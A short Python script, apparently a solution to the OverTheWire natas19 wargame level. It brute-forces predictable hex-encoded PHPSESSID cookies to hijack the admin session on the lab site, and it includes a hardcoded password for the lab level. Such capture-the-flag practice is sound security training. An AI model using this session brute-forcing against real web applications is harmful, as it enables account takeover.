#!/usr/bin python

import requests
from requests.auth import HTTPBasicAuth

data = { 'username': 'admin', 'password': 'admin' }
url = 'http://natas19.natas.labs.overthewire.org/index.php'

s = requests.Session()
for i in range(0, 1000):
    firstNum= f"{i:03}"[2]
    secondNum=f"{i:03}"[1]
    lastNum=f"{i:03}"[0]
    req = s.post(url, auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), data=data, cookies=dict(PHPSESSID=f"3{firstNum}3{secondNum}3{lastNum}2d61646d696e"))
    if "You are an admin" in req.text:
        print(req.text)
        print(f"Cookie: 3{firstNum}3{secondNum}3{lastNum}2d61646d696e")
        break


